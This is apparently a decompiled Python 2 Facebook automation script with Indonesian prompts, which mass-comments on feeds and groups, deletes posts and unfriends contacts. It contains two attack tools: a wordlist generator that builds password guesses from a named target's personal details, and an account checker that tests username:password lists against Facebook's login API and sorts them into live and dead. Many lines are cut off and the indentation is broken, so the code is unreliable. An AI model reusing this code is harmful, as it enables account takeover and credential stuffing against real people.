        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar  \x1b[1;91m:\x1b[1;9>
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97>
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=f>
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;>
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?>
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + >

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(ko>
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Not Found!'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
            def grup_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found!'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print "\x1b[1;91m[!] \x1b[1;92mEquip \x1b[1;97m'<>' \x1b[1;92mUntuk>
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup  \x1b[1;91m:\x1b[1;9>
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComment \x1b[1;91m:\x1b[1;97>
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97>
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide +>
            asw = json.loads(ah.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNam>
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fie>
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting... \x1b[1;>
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?>
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + >

            print
            print '\r\x1b[1;91m[+]\x1b[1;97mClear \x1b[1;96m' + str(len(ko>
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Not found!'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
            def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + to>
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token Not Found!'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;91m[+] \x1b[1;92mStar Deleting Post\x1b[1;9>
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + t>
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=dele>
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...>
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...>
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Koneksi Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mClear'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()
    def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + >
    teman = json.loads(r.text)
    if '[]' in str(teman['data']):
        print '\x1b[1;91m[!] There is no friend request!'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting... \x1b[1;97m...')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for i in Friend['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['fro>
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;91m[+] \x1b[1;92mName \x1b[1;91m:\x1b[1;97m ' + i[>
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i[>
            print 40 * '\x1b[1;97m\xe2\x95\x90'
        else:
            print '\x1b[1;91m[+] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + i[>
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i[>
            print 40 * '\x1b[1;97m\xe2\x95\x90'

    print '\n\x1b[1;91m[+] \x1b[1;97mClear'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found!'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
        else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting... \x1b[1;97m.>
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
        print
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_>
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' >
                print '\x1b[1;97m[\x1b[1;92mErassed!\x1b[1;97m] ' + nama + ' >

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mClear'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def lain():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found?'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
        os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Make it postingan'
    print '\x1b[1;37;40m2. Make it Wordlist'
    print '\x1b[1;37;40m3. Akun Checker'
    print '\x1b[1;37;40m4. See Group List'
    print '\x1b[1;37;40m5. Profile Guard'
    print
    print '\x1b[1;97m  ->Coming soon<-'
    print
    print '\x1b[1;31;40m0. Back'
    print
    pilih_lain()


def pilih_lain():
    other = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if other == '':
        print '\x1b[1;91m[!] Jangan Sampai Kosong!'
        pilih_lain()
    else:
        if other == '1':
            status()
        else:
            if other == '2':
                wordlist()
            else:
                if other == '3':
                    check_akun()
                else:
                    if other == '4':
                        grupsaya()
                    else:
                        if other == '5':
                            guard()
                        else:
                            if other == '0':
                                menu()
                            else:
                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' +>
                                pilih_lain()
                                def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mSilahkan Ketik Statusnya\x1b[1;91m:\x1b[1;9>
    if msg == '':
        print '\x1b[1;91m[!] Jangan Sampai Kosong!'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&me>
        op = json.loads(res.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting \x1b[1;97m.>
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op>
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;92mSILAHKAN ISI DATA LENGKAP TARGET'
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            a = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Depan Target\x1b[1;97m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Tengah Target \x1b[1;97m: ')
            c = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Belakang Target \x1b[1;97m: >
            d = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan Target \x1b[1;97m:>
            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Target >\x1b[1;96me>
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;93mDilarang Untuk Jomblo :v'
            i = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Doi \x1b[1;97m: ')
            j = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan Doi \x1b[>
            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Doi >\x1b[>
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting \x1b[1;>
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%>
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;91m[+] \x1b[1;97mStored \x1b[1;91m: \x1b[1;97m>
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except IOError as e:
            print '\x1b[1;91m[!] Faild is file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack\x1b[1;91m]')
            lain()
            def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97musernam>
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;>
            list = open(file, 'r').readlines()
        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mPemisah \x1b[1;91m:\x1b[1;97>
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=2377>
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + userna>
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + userna>
        else:
            die.append(password)
            print '\x1b[1;97m[\x1b[1;91mMati\x1b[1;97m]  \x1b[1;97m' + userna>

    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;>
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    lain()
    def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting \x1b[1;97m.>
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_to>
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('groupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92>
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' >
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mNumber of group \x1b[1;96m%s' % le>
            print '\x1b[1;91m[+] \x1b[1;97mStored \x1b[1;91m: \x1b[1;97mgr>
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()
            except IOError:
            print '\x1b[1;91m[!] Error when opening file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Activate It'
    print '\x1b[1;37;40m2. NonActivate'
    print '\x1b[1;31;40m0. Back'
    print
    g = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                lain()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()
                    def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab>
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authoriz>
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDiaktif>
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDin>
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        else:
            print '\x1b[1;91m[!] Error'
            keluar()


if __name__ == '__main__':
        login()
# okay decompiling 3.pyc